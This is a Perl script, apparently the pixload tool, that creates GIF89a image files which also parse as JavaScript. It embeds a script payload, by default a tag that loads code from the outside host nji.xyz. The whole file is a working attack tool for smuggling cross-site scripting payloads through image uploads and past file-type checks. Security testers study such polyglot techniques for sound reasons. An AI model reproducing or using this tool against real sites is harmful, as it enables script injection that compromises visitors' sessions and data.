#!/usr/bin/perl
#
# GIF89a Image ~ Payload Creator
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to marcoramilli.blogspot.com
#
# See LICENSE file for copyright and license details.


use strict;
use warnings;
use feature qw(say);

use Getopt::Long;

sub usage;
sub create_gif;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0) if $help;
usage(1) unless $outfile;

$payload //= '<script src=//nji.xyz></script>';

my @gif = (
    # Signature + Version GIF89a
    "\x47\x49\x46\x38\x39\x61",

    # Encoding /* it's a valid Logical Screen Width
    "\x2f\x2a",

    # GCTF
    "\x00",

    # BackgroundColor
    "\xff",

    # Pixel Ratio
    "\x00",

    # GlobalColorTable + Blocks
    "\x2c\x00\x00\x00\x00\x2f\x2a\x0a\x00\x00\x02\x00\x3b",

    # Commenting out */
    "\x2a\x2f",

    # Enable the script side by introducing =1;
    "\x3d\x31\x3b",

    $payload,

    # Trailer
    "\x3b",
);

say <<EOF;
[>|      GIF89a Image ~ Payload Creator     |<]

    https://github.com/chinarulezzz/pixload

EOF

create_gif;

say `file $outfile`         if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub usage {
    say "Usage: $0 [-payload 'String'] -output payload.gif";
    exit +shift;
}

sub create_gif {
    say "[>] Prepare GIF file";

    local $" = '';

    if (index("@gif", $payload) == -1) {
        die "[✘] Bad gif data, this might not work\n";
    }

    say "[✔] GIF with payload successfully created";

    open my $fh, '>', $outfile or die;
    binmode $fh;
    print   $fh  "@gif";
    close   $fh;

    say "[✔] File saved to: $outfile\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
